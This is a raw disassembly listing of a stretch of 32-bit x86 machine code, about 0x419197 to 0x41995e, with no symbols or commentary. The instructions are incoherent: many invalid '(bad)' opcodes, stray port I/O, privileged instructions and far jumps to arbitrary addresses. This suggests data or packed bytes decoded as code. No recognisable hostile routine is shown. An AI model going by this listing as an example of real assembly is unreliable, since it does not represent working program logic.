  419197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419198:	test   eax,0x4e363aa7
  41919d:	add    al,BYTE PTR [esi-0x23c057bf]
  4191a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191a4:	test   eax,0xa3fd55da
  4191a9:	je     0x4191bf
  4191ab:	inc    eax
  4191ac:	fist   DWORD PTR [eax-0x1]
  4191af:	or     DWORD PTR [eax],edx
  4191b1:	mov    edi,0x1048beab
  4191b6:	in     eax,dx
  4191b7:	pmulhuw mm7,QWORD PTR [ecx+0x4d]
  4191bb:	mov    ch,0xa8
  4191bd:	outs   dx,DWORD PTR ds:[esi]
  4191be:	push   ss
  4191bf:	jns    0x419172
  4191c1:	mov    ebp,0xacdd9b74
  4191c6:	(bad)  
  4191c7:	das    
  4191c8:	adc    dl,dl
  4191ca:	or     esp,ecx
  4191cc:	test   BYTE PTR [edi-0x5352f45f],0x36
  4191d3:	dec    esp
  4191d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191d5:	retf   0xd22b
  4191d8:	pop    ebp
  4191d9:	sub    edx,DWORD PTR [ebp+0x44d986c5]
  4191df:	inc    ebp
  4191e0:	cli    
  4191e1:	pop    ebx
  4191e2:	ficomp WORD PTR [ebp-0x58d0828a]
  4191e8:	aam    0x31
  4191ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191eb:	imul   ecx,esp,0xd
  4191ee:	mov    WORD PTR [ebx+0x725f434e],cs
  4191f4:	mov    esp,DWORD PTR [ebx+0x3e]
  4191f7:	xchg   bh,bl
  4191f9:	inc    esi
  4191fa:	mov    esp,DWORD PTR [esi-0x45]
  4191fd:	cmp    BYTE PTR [esi],ch
  4191ff:	aas    
  419200:	pop    ss
  419201:	aaa    
  419202:	xor    eax,0x4f95692c
  419207:	stos   DWORD PTR es:[edi],eax
  419208:	and    esp,DWORD PTR [edx-0x75bcb02c]
  41920e:	mov    dl,0x5f
  419210:	gs xchg esp,eax
  419212:	cld    
  419213:	xor    al,0x65
  419215:	push   ecx
  419216:	and    ecx,DWORD PTR [ebp+0x661b19]
  41921c:	in     eax,dx
  41921d:	push   0xd9fe8def
  419222:	cmp    DWORD PTR [edi-0x17],0x60da5bc4
  419229:	jbe    0x4191e1
  41922b:	sbb    al,dh
  41922d:	mov    cl,0xd0
  41922f:	mov    cl,bl
  419231:	int    0x5a
  419233:	pop    eax
  419234:	stos   DWORD PTR es:[edi],eax
  419235:	dec    edx
  419236:	push   es
  419237:	sbb    esi,DWORD PTR [ecx+0x3ed526c0]
  41923d:	xor    bl,BYTE PTR [ebp+ecx*8+0x3c]
  419241:	mov    eax,0xd4c559ca
  419246:	dec    esp
  419247:	mov    al,0xa1
  419249:	xchg   edx,eax
  41924a:	sbb    DWORD PTR [ebx-0x38],edx
  41924d:	dec    ebp
  41924e:	imul   ecx,edx,0x33
  419251:	in     eax,dx
  419252:	sub    ecx,DWORD PTR [eax]
  419254:	mov    edi,0x23a7cbbf
  419259:	jmp    0x419294
  41925b:	lods   eax,DWORD PTR ds:[esi]
  41925c:	mov    eax,ds:0xfb0c8455
  419261:	sti    
  419262:	xchg   ebp,eax
  419263:	sbb    ecx,DWORD PTR [eax-0x77c08188]
  419269:	dec    edx
  41926a:	stos   BYTE PTR es:[edi],al
  41926b:	mov    edi,0xf0a77d61
  419270:	mov    ebx,0xc30ab200
  419275:	push   ss
  419276:	mov    dh,0x32
  419278:	fcom   QWORD PTR [ebp-0x9d0f3e8]
  41927e:	jne    0x4192cc
  419280:	rcl    BYTE PTR fs:[eax+0x2ded6f25],0xa3
  419288:	aam    0x9b
  41928a:	cmp    al,0xe5
  41928c:	adc    ebp,ebx
  41928e:	xchg   al,dh
  419290:	pop    eax
  419291:	ds push cs
  419293:	mov    DWORD PTR [esi],0xe2137c9e
  419299:	and    dh,BYTE PTR ds:0xb17290eb
  41929f:	arpl   WORD PTR ds:0xd2f18004,cx
  4192a5:	dec    ebp
  4192a6:	cdq    
  4192a7:	rcl    BYTE PTR ds:0x91ac0384,cl
  4192ad:	pop    ds
  4192ae:	add    al,0x79
  4192b0:	mov    ds:0x58d7daa3,eax
  4192b5:	or     esp,edi
  4192b7:	mov    ecx,0x216005b7
  4192bc:	icebp  
  4192bd:	hlt    
  4192be:	mov    esp,0x17bb8453
  4192c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192c4:	pop    es
  4192c5:	cmp    al,BYTE PTR [eax]
  4192c7:	sbb    BYTE PTR [edx+0x982fac6],0x77
  4192ce:	pop    ds
  4192cf:	shr    dh,0xef
  4192d2:	test   DWORD PTR [esi+edi*4-0x58],ebx
  4192d6:	lods   al,BYTE PTR ds:[esi]
  4192d7:	icebp  
  4192d8:	sub    bl,ah
  4192da:	(bad)  
  4192db:	sti    
  4192dc:	aaa    
  4192dd:	sub    al,0xe8
  4192df:	jmp    FWORD PTR [edx+ecx*2+0x6d]
  4192e3:	pop    esp
  4192e4:	aaa    
  4192e5:	push   cs
  4192e6:	out    dx,eax
  4192e7:	dec    edx
  4192e8:	mov    ds,WORD PTR [ebx-0x39]
  4192eb:	and    ah,dh
  4192ed:	inc    esi
  4192ee:	sbb    BYTE PTR [eax],0xeb
  4192f1:	pop    ds
  4192f2:	adc    al,0x8c
  4192f4:	div    DWORD PTR [edi+0x5d]
  4192f7:	add    DWORD PTR [eax-0x5a],edi
  4192fa:	aaa    
  4192fb:	or     esp,ebp
  4192fd:	pop    edx
  4192fe:	jmp    FWORD PTR [edi]
  419300:	jl     0x41936c
  419302:	add    dh,BYTE PTR [ebx]
  419304:	pop    esp
  419305:	pushf  
  419306:	mov    bl,BYTE PTR [eax+0x2f]
  419309:	dec    esp
  41930a:	xchg   ecx,eax
  41930b:	cmp    eax,0x56c92c2
  419310:	jbe    0x4192f5
  419312:	mov    ecx,0x28d4b2f4
  419317:	mov    ch,0x2c
  419319:	or     BYTE PTR [edi-0x60fb85cd],ch
  41931f:	cld    
  419320:	dec    ebp
  419321:	xor    BYTE PTR ds:0x2e26b419,al
  419327:	cmp    BYTE PTR [ebx+eax*2],al
  41932a:	(bad)  
  41932b:	rcl    ebp,cl
  41932d:	(bad)  [edi+0x43]
  419330:	aad    0x5e
  419332:	inc    edx
  419333:	push   ds
  419334:	nop
  419335:	add    al,0x78
  419337:	inc    ebx
  419338:	xchg   edi,eax
  419339:	jle    0x4192cf
  41933b:	push   ecx
  41933c:	data16 arpl WORD PTR [eax-0x5e],bx
  419340:	push   edx
  419341:	gs xor ecx,esi
  419344:	je     0x4192ef
  419346:	test   DWORD PTR [ebx],eax
  419348:	test   DWORD PTR [esi-0x556ea87],edx
  41934e:	and    al,0x3f
  419350:	out    0x3f,eax
  419352:	mov    bh,0x98
  419354:	(bad)  
  419355:	pop    ds
  419356:	mov    bl,0x27
  419358:	sbb    esi,0x2fe836d9
  41935e:	and    ebp,DWORD PTR [edi+0x3]
  419361:	add    BYTE PTR [ebp+0x1e],dh
  419364:	cs inc edi
  419366:	int3   
  419367:	out    0x21,eax
  419369:	(bad)  
  41936a:	aam    0x4f
  41936c:	icebp  
  41936d:	inc    ebx
  41936e:	sbb    ebx,esp
  419370:	pop    ebx
  419371:	xchg   ebp,eax
  419372:	jo     0x419383
  419374:	inc    edi
  419375:	leave  
  419376:	das    
  419377:	retf   
  419378:	xacquire xchg DWORD PTR [esp+ebp*8],eax
  41937c:	inc    ebp
  41937d:	dec    ebx
  41937e:	in     al,dx
  41937f:	sbb    al,BYTE PTR [esi+0x4b]
  419382:	jecxz  0x4193e1
  419384:	in     eax,dx
  419385:	inc    esi
  419386:	shl    BYTE PTR [edi-0x44],1
  419389:	dec    cx
  41938b:	jmp    0x419351
  41938d:	sahf   
  41938e:	lods   al,BYTE PTR ds:[esi]
  41938f:	jo     0x41937e
  419391:	icebp  
  419392:	sbb    eax,0x465731d8
  419397:	xchg   esi,eax
  419398:	lahf   
  419399:	popf   
  41939a:	cmp    eax,0x7af13f50
  41939f:	sub    ebx,DWORD PTR [ebx-0x4493bc5]
  4193a5:	pop    esp
  4193a6:	jb     0x4193fb
  4193a8:	push   esp
  4193a9:	fidiv  WORD PTR [ebx+eiz*4+0x45ecec33]
  4193b0:	jge    0x41939d
  4193b2:	sbb    ecx,DWORD PTR [ecx+edi*8]
  4193b5:	inc    eax
  4193b6:	out    dx,eax
  4193b7:	loop   0x419364
  4193b9:	shl    BYTE PTR [eax+edi*1],cl
  4193bc:	bnd ret 
  4193be:	or     eax,0xbb742511
  4193c3:	aam    0xd2
  4193c5:	mov    esi,0x57ea4431
  4193ca:	xchg   BYTE PTR [ebp+0x58],bl
  4193cd:	adc    cl,ah
  4193cf:	mov    esi,0x8d2435f1
  4193d4:	fcom   QWORD PTR [eax-0x35bfdbc3]
  4193da:	dec    edi
  4193db:	mov    edi,0x1852b6f5
  4193e0:	dec    ecx
  4193e1:	jno    0x41937a
  4193e3:	sub    esi,ebp
  4193e5:	pushf  
  4193e6:	mov    dh,0xc
  4193e8:	fwait
  4193e9:	pop    DWORD PTR [edx+0x2f2aa60d]
  4193ef:	dec    eax
  4193f0:	ins    DWORD PTR es:[edi],dx
  4193f1:	pop    ebp
  4193f2:	fs push edi
  4193f4:	daa    
  4193f5:	jg     0x419466
  4193f7:	sub    esp,DWORD PTR [edi-0x18]
  4193fa:	(bad)  [ecx+0x687de32]
  419400:	or     eax,0xf4d120c5
  419405:	mov    ecx,0xb3364950
  41940a:	adc    al,0x81
  41940c:	scas   eax,DWORD PTR es:[edi]
  41940d:	jbe    0x419474
  41940f:	aas    
  419410:	mov    ah,0x82
  419412:	sub    eax,0xf621cbaa
  419417:	mov    eax,0xc37efaba
  41941c:	xchg   esp,eax
  41941d:	ins    DWORD PTR es:[edi],dx
  41941e:	mov    ebx,DWORD PTR [ebx-0x3e4d5c01]
  419424:	ins    DWORD PTR es:[edi],dx
  419425:	push   esp
  419426:	(bad)
  419429:	pop    edx
  41942a:	sahf   
  41942b:	aam    0xde
  41942d:	call   0x2051:0xfcfdded8
  419434:	leave  
  419435:	pop    eax
  419436:	(bad)  
  419437:	push   esp
  419438:	add    BYTE PTR [edx],dl
  41943a:	ret    0x957a
  41943d:	je     0x419445
  41943f:	fmul   st(4),st
  419441:	aaa    
  419442:	and    dh,bh
  419444:	call   0x9d06:0x5186ca73
  41944b:	leave  
  41944c:	loopne 0x4194b7
  41944e:	sbb    al,0x19
  419450:	ficom  WORD PTR [esi]
  419452:	adc    al,0xd8
  419454:	pop    ds
  419455:	cs sbb ebx,0xffffff87
  419459:	jnp    0x41943e
  41945b:	mov    esi,0x2c239862
  419460:	dec    eax
  419461:	cmp    bl,BYTE PTR [edx-0x5d]
  419464:	dec    ebx
  419465:	sub    al,0x6f
  419467:	cli    
  419468:	mov    ebp,0xf24f3351
  41946d:	lea    eax,[bp+si-0x146f]
  419472:	jb     0x4193ff
  419474:	(bad)  
  419476:	push   ds
  419477:	mov    esp,DWORD PTR [eax]
  419479:	test   eax,0xbcc7bfd
  41947e:	out    dx,eax
  41947f:	ds cdq 
  419481:	cwde   
  419482:	leave  
  419483:	inc    ecx
  419484:	xor    dh,BYTE PTR [eax]
  419486:	jo     0x419437
  419488:	sub    al,0x9
  41948a:	jbe    0x419450
  41948c:	mov    WORD PTR [esi-0x7b],?
  41948f:	das    
  419490:	jle    0x419451
  419492:	mov    eax,ds:0x4a239568
  419497:	loope  0x41950b
  419499:	repnz push 0xd290f289
  41949f:	dec    ebx
  4194a0:	cmp    ebx,DWORD PTR [ebp-0x41c6967e]
  4194a6:	xor    al,BYTE PTR [edx+0x10]
  4194a9:	jl     0x419519
  4194ab:	test   ecx,edx
  4194ad:	sbb    ch,BYTE PTR [eax-0x3ee2fbb0]
  4194b3:	mov    esi,0x34da497b
  4194b8:	outs   dx,BYTE PTR ds:[esi]
  4194b9:	inc    edx
  4194ba:	xchg   edi,eax
  4194bb:	adc    BYTE PTR [esi+0x74],al
  4194be:	jmp    FWORD PTR [ecx-0x50]
  4194c1:	retf   
  4194c2:	mov    esi,0x646ea50d
  4194c7:	mov    bh,0x51
  4194c9:	sub    DWORD PTR [edx-0x20],esp
  4194cc:	mov    al,0xc8
  4194ce:	and    al,0x95
  4194d0:	mov    bh,0xed
  4194d2:	inc    esi
  4194d3:	mov    esp,ds
  4194d5:	inc    esi
  4194d6:	dec    ebp
  4194d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194d8:	jle    0x4194b4
  4194da:	(bad)  
  4194db:	daa    
  4194dc:	sbb    DWORD PTR [eax],0xffffffdb
  4194df:	push   ebx
  4194e0:	(bad)  
  4194e1:	sbb    esp,edx
  4194e3:	sbb    eax,0x51f9e19f
  4194e8:	adc    eax,0x3abc844d
  4194ed:	jnp    0x4194f2
  4194ef:	inc    BYTE PTR ds:0x3d3ba934
  4194f5:	dec    esp
  4194f6:	cld    
  4194f7:	dec    ecx
  4194f8:	jo     0x4194af
  4194fa:	fld    QWORD PTR [ecx]
  4194fc:	pop    ds
  4194fd:	paddsw mm3,QWORD PTR [esi+0x4be5e8cf]
  419504:	adc    DWORD PTR [ebx],0x40958db2
  41950a:	test   eax,0xcf5bb4ea
  41950f:	and    al,bh
  419511:	dec    ebp
  419512:	pop    ebx
  419513:	inc    eax
  419514:	or     cl,BYTE PTR [ebx-0x2a9e37b5]
  41951a:	repnz xchg ebp,eax
  41951c:	inc    esp
  41951d:	mov    cl,0xf4
  41951f:	out    0x19,eax
  419521:	push   ebx
  419522:	retf   0xc375
  419525:	icebp  
  419526:	ins    DWORD PTR es:[edi],dx
  419527:	xchg   esp,ecx
  419529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41952a:	or     DWORD PTR [ecx+0x21],eax
  41952d:	outs   dx,DWORD PTR ds:[esi]
  41952e:	inc    edi
  41952f:	mov    ds:0xe727fe39,eax
  419534:	lahf   
  419535:	xlat   BYTE PTR ds:[ebx]
  419536:	loope  0x419544
  419538:	cmp    edx,DWORD PTR [ebp-0x39b0cbe1]
  41953e:	xor    BYTE PTR ss:[ecx-0x53],0x36
  419543:	xor    eax,ebx
  419545:	mov    ebx,0xd08b3a37
  41954a:	sbb    eax,0x58c4b8ac
  41954f:	sbb    esp,edi
  419551:	int3   
  419552:	xor    esp,DWORD PTR [ebp-0x2da4e018]
  419558:	nop
  419559:	mov    al,ds:0x21a27b48
  41955e:	mov    edi,0xffd1ee2
  419563:	popf   
  419564:	push   ebp
  419565:	push   edi
  419566:	lods   eax,DWORD PTR ds:[esi]
  419567:	mov    BYTE PTR [ecx-0x78639ed7],dl
  41956d:	gs dec ebx
  41956f:	(bad)  
  419570:	sti    
  419571:	mov    esp,ecx
  419573:	push   cs
  419574:	xor    DWORD PTR [edi],esp
  419576:	mov    al,ds:0x2918cf92
  41957b:	xchg   esp,eax
  41957c:	pop    ecx
  41957d:	pop    ss
  41957e:	into   
  41957f:	push   edx
  419580:	outs   dx,DWORD PTR ds:[esi]
  419581:	into   
  419582:	lea    ebp,[edi+eax*4]
  419585:	jge    0x419567
  419587:	int    0x98
  419589:	and    al,0xa2
  41958b:	push   0x53
  41958d:	in     eax,0xaf
  41958f:	xor    cl,BYTE PTR [edx]
  419591:	cmp    dl,BYTE PTR ss:[esi-0xb]
  419595:	xchg   ah,dl
  419597:	inc    edx
  419598:	dec    ecx
  419599:	xchg   ebx,eax
  41959a:	cmc    
  41959b:	mov    bh,0x83
  41959d:	cs ret 0x878b
  4195a1:	pop    edi
  4195a2:	loop   0x4195dd
  4195a4:	cli    
  4195a5:	popa   
  4195a6:	add    DWORD PTR [eax],ecx
  4195a8:	mov    ch,0x10
  4195aa:	loop   0x41960d
  4195ac:	pop    eax
  4195ad:	jnp    0x41955a
  4195af:	scas   eax,DWORD PTR es:[edi]
  4195b0:	test   cl,al
  4195b2:	loope  0x4195e2
  4195b4:	out    dx,al
  4195b5:	stc    
  4195b6:	pop    ds
  4195b7:	ja     0x419620
  4195b9:	(bad)  
  4195ba:	mov    ds:0xe9ae1762,al
  4195bf:	pop    eax
  4195c0:	xchg   ebx,eax
  4195c1:	fisub  WORD PTR [ecx+0x66418ffd]
  4195c7:	xor    esp,DWORD PTR [edi+0x4cdfb8b8]
  4195cd:	das    
  4195ce:	mov    al,ds:0xeb09ae2e
  4195d3:	push   es
  4195d4:	pop    ebp
  4195d5:	add    ebp,DWORD PTR [edx]
  4195d7:	mov    ebx,DWORD PTR [ebx-0x3]
  4195da:	pop    esp
  4195db:	repnz repnz push esp
  4195de:	dec    ebp
  4195df:	outs   dx,BYTE PTR ds:[esi]
  4195e0:	xchg   esp,eax
  4195e1:	fsubr  DWORD PTR [ecx-0x68]
  4195e4:	shl    BYTE PTR [edi-0x16],cl
  4195e7:	mov    dh,0x8a
  4195e9:	mov    al,0xd2
  4195eb:	call   0x318c:0x9db8f85a
  4195f2:	dec    ebx
  4195f3:	test   al,0x55
  4195f5:	push   edi
  4195f6:	and    DWORD PTR [ecx+0x4],0x69
  4195fa:	and    al,0x60
  4195fc:	xchg   BYTE PTR [edx],al
  4195fe:	mov    BYTE PTR [bp+si-0x14],ah
  419602:	or     BYTE PTR [edi],dl
  419604:	daa    
  419605:	rcl    BYTE PTR [ebx+esi*2+0x37],1
  419609:	and    BYTE PTR [ecx],al
  41960b:	test   ebx,eax
  41960d:	mov    eax,ds:0xd90ce897
  419612:	jne    0x41964f
  419614:	and    dh,BYTE PTR [ebp-0xe]
  419617:	mov    dl,0x1a
  419619:	out    dx,eax
  41961a:	pop    edi
  41961b:	arpl   WORD PTR [esi+0x74fed75e],bx
  419621:	popf   
  419622:	cli    
  419623:	inc    eax
  419624:	sbb    DWORD PTR [esp+eiz*4-0x28],edi
  419628:	mul    DWORD PTR [ebx+0x2997bbaf]
  41962e:	or     DWORD PTR [edi-0x7a],edi
  419631:	jle    0x41968a
  419633:	sbb    BYTE PTR [esi],dh
  419635:	sbb    DWORD PTR [edi-0x2f],edx
  419638:	and    BYTE PTR [ebx+edx*4-0x16],al
  41963c:	sbb    eax,0x60a5f336
  419641:	mov    ebx,0x5bbf75bc
  419646:	dec    eax
  419647:	pop    ebp
  419648:	clc    
  419649:	retf   
  41964a:	lods   eax,DWORD PTR ds:[esi]
  41964b:	(bad)  
  41964c:	scas   eax,DWORD PTR es:[edi]
  41964d:	fs cli 
  41964f:	rol    DWORD PTR [ebp+0x5ec1aebf],1
  419655:	cmp    ch,BYTE PTR [eax+0x5b0c8551]
  41965b:	or     DWORD PTR [ebp-0x6e],ebp
  41965e:	xor    dl,BYTE PTR [ebp-0x17]
  419661:	mov    edi,0x4206051a
  419666:	cwde   
  419667:	push   edi
  419668:	inc    ebp
  419669:	mov    ?,WORD PTR [eax]
  41966b:	mov    ds:0x509fbc44,al
  419670:	cli    
  419671:	sub    eax,0x3c6c674d
  419676:	and    al,0x75
  419678:	outs   dx,BYTE PTR ds:[esi]
  419679:	in     eax,dx
  41967a:	cld    
  41967b:	dec    ecx
  41967c:	xchg   edi,eax
  41967d:	shl    DWORD PTR [ebp+0x3a],cl
  419680:	retf   
  419681:	adc    DWORD PTR [ebx-0x2e9d1f99],0x5230e2b6
  41968b:	add    DWORD PTR [ebp-0x55d59c23],edx
  419691:	adc    edi,DWORD PTR [esi+0x5ddfefe3]
  419697:	std    
  419698:	push   ss
  419699:	jmp    0x86eb:0x2718f882
  4196a0:	into   
  4196a1:	adc    al,cl
  4196a3:	xchg   ecx,eax
  4196a4:	inc    ebp
  4196a5:	jl     0x419675
  4196a7:	xor    esp,esi
  4196a9:	fimul  WORD PTR [edi+0x7f]
  4196ac:	xor    al,0x2e
  4196ae:	jb     0x419671
  4196b0:	jp     0x4196a5
  4196b2:	jecxz  0x419658
  4196b4:	mov    bl,0x9b
  4196b7:	leave  
  4196b8:	mov    ebx,0xf8688284
  4196bd:	test   eax,0x32ea20ec
  4196c2:	cmp    al,0x77
  4196c4:	push   ds
  4196c5:	jl     0x419708
  4196c7:	push   ebx
  4196c8:	shr    BYTE PTR [ebx-0xd],1
  4196cb:	or     BYTE PTR [edx-0x21af0f1d],bh
  4196d1:	outs   dx,BYTE PTR ds:[esi]
  4196d2:	and    ebx,ebp
  4196d4:	cs (bad) 
  4196d6:	jno    0x4196dc
  4196d8:	int    0xe
  4196da:	cwde   
  4196db:	adc    DWORD PTR [ebx],ebx
  4196dd:	dec    ecx
  4196de:	sub    eax,0xb48cf81b
  4196e3:	sbb    DWORD PTR [edx+eax*4+0x48],0xc6508206
  4196eb:	(bad)  
  4196ec:	fist   DWORD PTR [edi+0x4f30e89e]
  4196f2:	cli    
  4196f3:	mov    bl,0x2d
  4196f5:	jecxz  0x419681
  4196f7:	adc    dl,ch
  4196f9:	outs   dx,BYTE PTR ds:[esi]
  4196fa:	xlat   BYTE PTR ds:[ebx]
  4196fb:	jl     0x41976d
  4196fd:	(bad)  
  4196fe:	adc    al,ch
  419700:	test   al,bl
  419702:	ror    eax,cl
  419704:	cli    
  419705:	imul   edx,esi,0x5c
  419708:	jmp    0x29b:0xec7e3719
  41970f:	int3   
  419710:	daa    
  419711:	nop
  419712:	jle    0x419716
  419714:	jmp    0x2078:0xcd7e9a8c
  41971b:	add    eax,0x9513fd26
  419720:	cwde   
  419721:	cmp    BYTE PTR [esi],dl
  419723:	call   0x6bcc23f5
  419728:	xchg   edx,edi
  41972a:	nop
  41972b:	pop    ebp
  41972c:	gs xchg edx,eax
  41972e:	jle    0x419741
  419730:	outs   dx,DWORD PTR ds:[esi]
  419731:	pop    edi
  419732:	push   cs
  419733:	cmp    esp,DWORD PTR ds:0x2529026c
  419739:	std    
  41973a:	in     eax,0x25
  41973c:	scas   eax,DWORD PTR es:[edi]
  41973d:	xchg   DWORD PTR [esi],ebx
  41973f:	mov    edi,DWORD PTR [eax-0x4aa74edf]
  419745:	mov    dl,0xb6
  419747:	cmp    BYTE PTR [ebx-0x2ba2271c],bh
  41974d:	push   ebp
  41974e:	ss shl dl,0x75
  419752:	shl    BYTE PTR [edx],0xdd
  419755:	psubb  mm6,QWORD PTR [edi+edi*2]
  419759:	or     bl,dl
  41975b:	push   edi
  41975c:	xchg   ebx,eax
  41975d:	push   edx
  41975e:	int    0x68
  419760:	pop    esp
  419761:	xor    esp,0x75e19bd6
  419767:	xor    dl,BYTE PTR [ebx+0x395923]
  41976d:	mov    al,ds:0xcecd932a
  419772:	test   BYTE PTR [ebp-0x54c90b18],ch
  419778:	out    dx,eax
  419779:	sub    ebp,DWORD PTR [ecx-0x3e4e1e1f]
  41977f:	xor    DWORD PTR [edx-0x79],esi
  419782:	xchg   edi,eax
  419783:	lods   eax,DWORD PTR ds:[esi]
  419784:	jge    0x4197d1
  419786:	pop    ecx
  419787:	test   eax,0xa3e28971
  41978c:	aas    
  41978d:	fdiv   QWORD PTR [ebx-0x25b032ad]
  419793:	das    
  419794:	fmul   QWORD PTR [esp+eax*4+0x15]
  419798:	daa    
  419799:	cmp    al,0x7c
  41979b:	push   0xe4d5d53f
  4197a0:	out    0x1f,eax
  4197a2:	mov    esp,0x9291302c
  4197a7:	cmp    esp,DWORD PTR [ebx+0x7d]
  4197aa:	mov    ebp,0x9712e80c
  4197af:	cmp    al,0xbd
  4197b1:	retf   
  4197b2:	ds daa 
  4197b4:	int3   
  4197b5:	xchg   edi,eax
  4197b6:	ret    
  4197b7:	cmp    ah,BYTE PTR [ebx+0x23]
  4197ba:	out    0x1d,eax
  4197bc:	mov    ecx,0x51ff7d02
  4197c1:	fsubr  DWORD PTR [edx]
  4197c3:	ja     0x419825
  4197c5:	xchg   esi,eax
  4197c6:	cmp    ecx,ecx
  4197c8:	int3   
  4197c9:	mov    ds:0x3c7eb633,eax
  4197ce:	xchg   ebp,eax
  4197cf:	outs   dx,BYTE PTR ds:[esi]
  4197d0:	repz xor ch,BYTE PTR [ebp-0x7c4616a2]
  4197d7:	out    dx,eax
  4197d8:	push   ss
  4197d9:	sub    BYTE PTR [edi-0x1a],bl
  4197dc:	rcl    DWORD PTR [esi],cl
  4197de:	ds pop eax
  4197e0:	or     al,0x4a
  4197e2:	add    edi,DWORD PTR [ebx]
  4197e4:	push   ebx
  4197e5:	pop    ss
  4197e6:	call   0x4ee9:0xd9fa9b6b
  4197ed:	add    DWORD PTR [edi+0x28174036],eax
  4197f3:	pop    edi
  4197f4:	and    ebp,ebx
  4197f6:	pop    es
  4197f7:	int3   
  4197f8:	mov    ebx,0x15691669
  4197fd:	jnp    0x4197ea
  4197ff:	outs   dx,DWORD PTR ds:[esi]
  419800:	pop    eax
  419801:	xor    DWORD PTR [esi-0x7],esp
  419804:	repz jo 0x4197fc
  419807:	ret    0x1bc0
  41980a:	je     0x41982c
  41980c:	cmp    al,0xce
  41980e:	adc    dh,bh
  419810:	stc    
  419811:	aas    
  419812:	sub    al,0x49
  419814:	repnz loopne 0x41981e
  419817:	push   esp
  419818:	mov    bl,0xfc
  41981a:	push   ebp
  41981b:	inc    ebx
  41981c:	gs mov ah,0xcc
  41981f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419820:	sub    al,0x14
  419822:	arpl   WORD PTR [ebp+0x227f06ee],sp
  419828:	imul   edi,DWORD PTR [ebx+0x41831821],0x19673b75
  419832:	xchg   edx,eax
  419833:	jno    0x419840
  419835:	arpl   sp,bx
  419837:	nop
  419838:	jbe    0x41985d
  41983a:	arpl   WORD PTR ds:0x190284d1,bx
  419840:	enter  0x95b3,0xd2
  419844:	les    ebx,FWORD PTR gs:[ebx]
  419847:	and    ecx,DWORD PTR [ecx*1+0x60996412]
  41984e:	cmp    esi,DWORD PTR [edi+edx*8+0x37]
  419852:	leave  
  419853:	in     eax,0xbf
  419855:	retf   0xcc76
  419858:	push   esi
  419859:	jbe    0x4198aa
  41985b:	cmc    
  41985c:	lahf   
  41985d:	adc    ebp,DWORD PTR [ebp+0x1d]
  419860:	cmc    
  419861:	push   edi
  419862:	gs push eax
  419864:	out    0x7,eax
  419866:	push   0xabf1545c
  41986b:	or     eax,0x236a62ec
  419870:	jg     0x419801
  419872:	leave  
  419873:	push   ecx
  419874:	pop    ebp
  419875:	in     al,0x8b
  419877:	ins    BYTE PTR es:[edi],dx
  419878:	sub    edx,DWORD PTR [ebp+0x49]
  41987b:	push   edx
  41987c:	xchg   ebx,eax
  41987d:	dec    ebx
  41987e:	mov    ch,0xaf
  419880:	lods   al,BYTE PTR ds:[esi]
  419881:	inc    ebx
  419882:	out    dx,eax
  419883:	pop    edi
  419884:	dec    eax
  419885:	sub    al,0x91
  419887:	mov    edx,0x9927bc50
  41988c:	dec    edx
  41988d:	dec    esi
  41988e:	aad    0x79
  419890:	or     eax,0xdfb1deae
  419895:	loop   0x419848
  419897:	xchg   ebx,eax
  419898:	jb     0x4198c9
  41989a:	loope  0x41985e
  41989c:	jmp    0x90be:0x144409e0
  4198a3:	nop
  4198a4:	and    edx,DWORD PTR [ecx+ebp*4]
  4198a7:	mov    ebx,ecx
  4198a9:	cwde   
  4198aa:	pushf  
  4198ab:	xor    al,0x17
  4198ad:	or     eax,0x72a050d6
  4198b2:	dec    ebx
  4198b3:	in     eax,0x87
  4198b5:	cmp    BYTE PTR [ecx],bl
  4198b7:	sar    DWORD PTR [edx+eax*2-0x23],0x61
  4198bc:	dec    edi
  4198bd:	mov    esp,cs
  4198bf:	in     al,0x3b
  4198c1:	add    al,0x23
  4198c3:	adc    ebx,edi
  4198c5:	stc    
  4198c6:	xor    BYTE PTR [esi-0x4],al
  4198c9:	push   ecx
  4198ca:	lock int 0x23
  4198cd:	or     ch,BYTE PTR [esi]
  4198cf:	cmp    edi,DWORD PTR [ebx-0xf9d8891]
  4198d5:	jnp    0x419930
  4198d7:	add    DWORD PTR [ebx+0x66],esi
  4198da:	and    eax,0xdaae56d3
  4198df:	add    eax,0xe7103e5
  4198e4:	and    al,BYTE PTR [edx+eiz*1]
  4198e7:	nop
  4198e8:	test   eax,0xd5492a7e
  4198ed:	icebp  
  4198ee:	adc    ebp,DWORD PTR [edi]
  4198f0:	xor    DWORD PTR [ebx+0x5f],ebp
  4198f3:	out    0x12,al
  4198f5:	sub    DWORD PTR [edx+0x7adf599a],esp
  4198fb:	in     eax,dx
  4198fc:	pop    ecx
  4198fe:	and    al,cl
  419900:	int    0x6e
  419902:	or     BYTE PTR [esi-0x10],dl
  419905:	out    0x7e,al
  419907:	dec    edi
  419908:	aam    0x89
  41990a:	(bad)  
  41990b:	icebp  
  41990c:	mov    dl,0x94
  41990e:	sar    BYTE PTR [ebx+edi*1],cl
  419911:	aam    0x5f
  419913:	jnp    0x4198d0
  419915:	adc    eax,0x95bd237c
  41991a:	lods   eax,DWORD PTR ds:[esi]
  41991b:	dec    dl
  41991d:	sub    DWORD PTR [edi+0x5],esi
  419920:	imul   edi,DWORD PTR [edx+0x5d],0x33640340
  419927:	in     al,0xe7
  419929:	inc    ebx
  41992a:	and    edx,ebp
  41992c:	jb     0x419928
  41992e:	mov    eax,cs:0x6cf5d66a
  419934:	mov    al,ds:0x9f0d451d
  419939:	add    DWORD PTR [eax],0xffffffe2
  41993c:	sub    dh,ah
  41993e:	cs in  eax,dx
  419940:	mov    dh,0xc8
  419942:	push   ss
  419943:	int3   
  419944:	loop   0x419905
  419946:	fild   QWORD PTR [eax+0x4d]
  419949:	and    eax,0x2362be58
  41994e:	cmp    DWORD PTR [ebp-0x20532b28],edx
  419954:	loopne 0x419929
  419956:	xcrypt-cfb (bad)
  419957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419958:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41995a:	add    al,0x86
  41995c:	and    al,0xdb
  41995e:	pop    ebp
